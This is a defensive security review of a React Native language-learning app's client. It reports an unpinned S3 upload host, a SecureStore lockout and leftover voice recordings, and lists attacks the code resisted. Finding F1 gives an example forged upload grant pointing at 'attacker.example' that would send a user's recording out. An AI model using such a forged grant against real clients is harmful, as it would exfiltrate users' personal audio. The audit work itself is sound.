# Adversarial Review — App Client-Side Security

Date: 2026-08-14. Scope: `app/` (Expo RN SDK 57, source in `app/src/`), with live
verification of server contracts the client depends on against
`http://localhost:4000` (MOCK_AI=true, throwaway DB `ai_english_adversarial`).
AUDIT_REPORT.md (both passes) was read first; nothing listed there as
remediated or deliberately-left is re-reported (e.g. tombstone-wipe-on-session-expiry,
S3-grant-TTL messaging, logout-requires-connectivity, recorder recovery latch).

Method note: no jest mocks were trusted; every state-machine claim below was
traced against the real async ordering of the module-level storage queues
(`api.ts` `withTokenStorageLock`, `pending-assessment.ts` `serializeStorage`)
and React Native's single-threaded event loop.

## Findings

### F1 — S3 upload grant destination host is not pinned (low)

- **Where:** `app/src/lib/types.ts:338-353` (`safeUploadUrl`),
  `app/src/lib/types.ts:386-421` (`parseAudioUploadGrant`),
  consumed at `app/src/lib/api.ts:365-458` (`apiPostPresignedAudio`) and
  `app/src/components/Recorder.tsx:1010-1017`.
- **What:** The client validates a production upload grant as "hostile input"
  (AUDIT_REPORT.md, "Mobile reliability and trust boundaries") but only checks
  `uploadUrl` for: HTTPS scheme, non-empty hostname, no userinfo, no query, no
  fragment, length ≤ 2048. There is **no host allowlist** (e.g.
  `*.amazonaws.com` / the configured bucket hostname). A server response of
  `{mode:'s3', uploadUrl:'https://attacker.example/collect', uploadFields:{key:<valid>,
  'Content-Type':'audio/mp4', ...≤32 attacker-chosen fields ≤8KB each},
  audioKey:'audio-uploads/<userUuid>/<uuid>.m4a', contentType:'audio/mp4',
  expiresIn:900, maxBytes:26214400}` passes every client check, and the client
  then POSTs the learner's microphone recording to `attacker.example` via
  `File.upload` (native) or `fetch` multipart (web), then submits the matching
  `audioKey` to the real API.
- **Observed vs expected:** Expected (per the audit's hardening claim) that the
  client pins uploads to operator-controlled storage; observed that any
  well-formed HTTPS URL is accepted. `uploadFields` pass-through is bounded in
  count/size/type but not in *which* fields — `success_action_redirect`,
  `x-amz-meta-*`, etc. are all forwarded (low impact: the redirect target of a
  303 receives a bodyless GET).
- **Impact bound (stated honestly):** exploitation requires forging API
  responses. In production the API is reached over enforced HTTPS
  (`api.ts:55-57`), so a pure network attacker cannot do this; it needs a
  compromised or malicious server, which can already exfiltrate the same audio
  by signing a genuine grant and reading the object itself. The missing pin
  therefore does not create a new exfiltration channel against an intact
  server, but it removes the one client-side property that would (a) contain
  a partially-compromised server (SSRF/response-tampering class bug) and
  (b) keep exfiltration on operator-auditable infrastructure. Defense-in-depth
  gap in a control the report explicitly credits as hardening; severity low.
- **Suggested fix:** allowlist the expected bucket host pattern
  (e.g. `<bucket>.s3[.<region>].amazonaws.com` / configured CDN origin) in
  `safeUploadUrl`, driven by a build-time `EXPO_PUBLIC_` constant.

### F2 — Permanent SecureStore failure permanently locks the user out of the app (low)

- **Where:** `app/src/lib/auth.tsx:150-177` (restore effect sets
  `restoreError` on `getToken()` throw), `app/src/app/index.tsx:51-69`
  (restore-error UI), `app/src/app/_layout.tsx:38`
  (`Stack.Protected guard={!isRestoring && !restoreError && !token}`).
- **Trace:** If `SecureStore.getItemAsync` throws — not transiently (device
  locked, covered by retry) but *permanently*, e.g. an undecryptable entry
  restored via Android Auto Backup whose Keystore key never leaves the old
  device, or keychain-item corruption — then:
  1. `restoreError` is set and `token` stays `null`.
  2. The `(auth)` stack's protected-route guard is false whenever
     `restoreError` is non-null, so **login/signup are unreachable**.
  3. The gate screen renders only "Try Again" (`retrySessionRestore`), which
     re-runs the same failing read. No control clears the corrupt entry or
     continues as logged-out, and nothing in the codebase ever attempts
     `deleteItemAsync` as recovery for a persistently unreadable token entry.
  4. Net effect: the app is bricked on the error screen until the user
     reinstalls / clears app data. Contrast with the pending-assessment store,
     which *does* self-heal: unparseable values are deleted
     (`pending-assessment.ts:120`), though that path does not cover read
     *failures* either.
- **Observed vs expected:** Expected: an unrecoverable credential-store failure
  degrades to logged-out (worst case: user signs in again, which rewrites the
  entry via `saveToken`). Observed: permanent dead-end screen.
- **Impact:** device-local availability loss of the user's own session/UI.
  Requires an OS-level keystore/keychain failure, so likelihood is low; the
  failure mode once triggered is total and has no in-app escape.
- **Suggested fix:** after N failed restore attempts, offer "Reset secure
  session" that best-effort `deleteItemAsync`s the token key and proceeds to
  login.

### F3 — Orphaned voice recordings linger in the OS cache after process death (informational)

- **Where:** `app/src/components/Recorder.tsx` — recovery (`recoverPending`,
  lines 244-634) reconciles by `requestId`/`audioKey` only; `activeUriRef` is
  in-memory and is `null` after a process restart, so `discardRecording()`
  (lines 173-178) has nothing to delete. The recording file written by
  expo-audio into the app cache directory is never enumerated or cleaned by
  the app on the recovery path.
- **Impact:** if the process dies between record-stop and a completed submit,
  a voice recording (personal data) remains in the sandboxed cache directory
  until the OS evicts it. Both iOS and Android exclude app caches from
  backups and sandbox them per-app, and the `s3-granted` recovery path
  resubmits the server-side object without needing the file, so this is a
  privacy-residue note, not a breach. Consider sweeping cache audio files
  matching the recorder's naming on launch.

## Attacks tried that the code RESISTED (verified)

1. **Double-submit / double charge.** `submit()` sets `operationRef`
   synchronously before any await (`Recorder.tsx:936`), so a second tap in the
   same event-loop turn is dropped; the Submit button only exists in the
   `recorded` phase. The durable tombstone is written *before* any network I/O
   (`Recorder.tsx:966-987`), and stage marks (`s3-granted`/`direct-posting`)
   land before the corresponding upload. Live proof of the server half: two
   identical multipart POSTs to `/diagnostic/answer` with the same
   `requestId=9c78a1ca-…` returned the identical stored response (200, same
   score/nextQuestion) — the replay does not create a second attempt or a
   second paid call.
2. **Ambiguous-failure recovery replay.** Recovery reuses the same `requestId`
   and `audioKey` and only resubmits after 3 consecutive 404s spanning ≥10s
   (`Recorder.tsx:526-549`); the server's idempotency claim makes the replay
   free. Verified live: `GET /assessments/<requestId>` returns
   `{status:'completed', context, questionId, response}` in exactly the shape
   the client reconciles against, and a random UUID returns 404.
3. **Cross-account submission via stale tombstone.** `recoverPending` compares
   `pending.ownerId` to the signed-in user's id before any network call and
   wipes foreign tombstones (`Recorder.tsx:330-341`); tombstone parsing rejects
   `audioKey`s whose path prefix isn't the owner's UUID
   (`pending-assessment.ts:27-37, 81-87`). A grant carrying another user's key
   never reaches S3 because `markPendingAssessmentStage` throws *before* the
   upload. Live: `GET /assessments/<user2's requestId>` with user1's fresh
   token → 404 (no cross-user recovery oracle).
4. **Stale-identity callbacks after sign-out.** Every async continuation in
   Recorder checks owner/endpoint/question against `identityRef` plus
   mounted/focused/AppState; `expireSession` ignores 401s for non-current
   tokens and during owned transitions (`auth.tsx:124-143`); conditional
   `clearToken(expectedToken)` (`api.ts:157-176`) means a stale 401 cleanup can
   never delete a newer login's token, and all SecureStore ops are serialized.
5. **Token rotation assumptions.** Verified live: `POST /auth/change-password`
   returns a new token; the old token then gets 401 on `/auth/me`, the new one
   200. A wrong current password → 401 and the session stays valid (matches
   `verifySessionAfterCredentialError`'s assumption). `POST /auth/logout` →
   204 and the token is dead afterwards. Duplicate register → 409 (matches the
   signup screen's mapping).
6. **Token leakage.** No `console.*`, no AsyncStorage, no token in URLs or
   query params anywhere in `app/src`; both SecureStore entries use
   `WHEN_UNLOCKED_THIS_DEVICE_ONLY` with a dedicated keychain service. Server
   side, pino redacts `req.headers.authorization` (and cookie/x-api-key) at the
   base logger, not just pino-http (`server/src/logger.ts:14-30`), so the
   bearer token the client sends cannot land in logs.
7. **Cleartext / silent base-URL redirection.** `resolveBaseUrl`
   (`api.ts:41-63`) throws at module load if a production build lacks
   `EXPO_PUBLIC_API_URL` or if it isn't HTTPS, and rejects credentials/query/
   fragment — it crashes rather than falling back to cleartext or a derived
   host. The `hostUri`-derived LAN URL and emulator fallbacks are reachable
   only under `__DEV__`. No HTTP endpoint is ever constructed in release code.
8. **Error-path information disclosure.** `throwForStatus` (`api.ts:182-185`)
   discards server bodies entirely; every user-facing string is a fixed
   constant via `userMessageForError` or the components; the route error
   boundary (`_layout.tsx:96-116`) shows no stack/provider detail.
9. **Deep-link / URL surface.** Scheme `app` (`app.json:5`) with expo-router:
   all parameterized routes validate UUID shape (`params.ts`) and render only
   client-safe strings; the attempt/help screens' data comes from the API,
   which enforces diagnostic completion, level, and attempt eligibility
   server-side (`server/src/practice.ts:223, 246-247, 285-286`; verified live:
   help endpoint 403s before diagnostic completion). No WebView anywhere; the
   only `Linking` call is `openSettings()`.
10. **S3 401 ≠ session expiry.** A 401 from the presigned S3 POST is thrown as
    a plain `ApiError` and never routed to `handleUnauthorized`
    (`api.ts:365-434`), so an expired S3 policy cannot log the user out of the
    API session; only API-origin 401s on authenticated calls do.
11. **Direct-upload contract.** Live end-to-end: dev grant returns
    `{"mode":"direct"}`; multipart `audio`+`questionId`+`requestId` to
    `/diagnostic/answer` → 200 with a body that satisfies
    `parseDiagnosticAnswerResult` (passed/score/transcript/feedback/done/
    nextQuestion all present and in-contract). The client's missing-file 400
    guard and 25 MiB ceiling mirror the server's.

## Not verified (out of reach of this pass)

- Real `File.upload` multipart field *ordering* against actual S3 (Expo native
  behavior; jest mocks don't prove it — already listed as audit P1.7).
- iOS Keychain/Android Keystore failure injection for F2 (no device/emulator
  here); F2 rests on a pure code trace of the UI/guard logic, which is solid.
- Behavior of `expo-secure-store` entries across Android Auto Backup (relevant
  trigger for F2).
